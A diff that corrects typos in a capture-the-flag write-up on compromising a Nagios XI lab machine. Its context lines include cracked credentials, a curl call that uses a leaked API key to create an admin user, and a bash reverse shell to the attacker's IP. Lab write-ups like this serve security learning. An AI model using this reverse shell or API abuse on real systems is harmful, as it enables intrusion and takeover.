@@ -119,10 +119,10 @@ Below the users table:
 
 Brute force hashes from database give me  new credentials: `nas:test`!  
 But, at this point, I can do nothing...  
-After looking back at the `xi_users` table and seeing the `api_key` field i decided to explore the `API` way.  
+After looking back at the `xi_users` table and seeing the `api_key` field I decided to explore the `API` way.  
 ![monitored12](/images/blog/writeup/monitored/monitored12.png)
 
-After hours of enumeration (nagios api documentation is very poor), i successfully created a new admin user! 🔥  
+After hours of enumeration (nagios api documentation is very poor), I successfully created a new admin user! 🔥  
 
 ```shell
 curl -k -XPOST "https://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&pretty=1" -d "username=pwnedeheh&password=pwned&auth_level=admin&email=pwned@localhost&name=pwned"
@@ -154,7 +154,7 @@ bash -c 'bash -i >& /dev/tcp/10.10.14.115/1996 0>&1'
 
 The `Service` one:  
 ![monitored16](/images/blog/writeup/monitored/monitored16.png)
-The button ton run the `Service`.  
+The button to run the `Service`.  
 ![monitored17](/images/blog/writeup/monitored/monitored17.png)
 Let's go we have our entry point!  
 
@@ -222,7 +222,7 @@ fi
 ```
 
 Let's resume:
-- We have rights to execute some services but binaries do not exist. 
+- I am allowed to run some services, but the required binaries do not exist.
 - `manage_services.sh` permits to run service with `systemctl`.  
 
 Ok so, in the case `npcd` is started from `systemctl`, I need to check `systemd` service configuration:
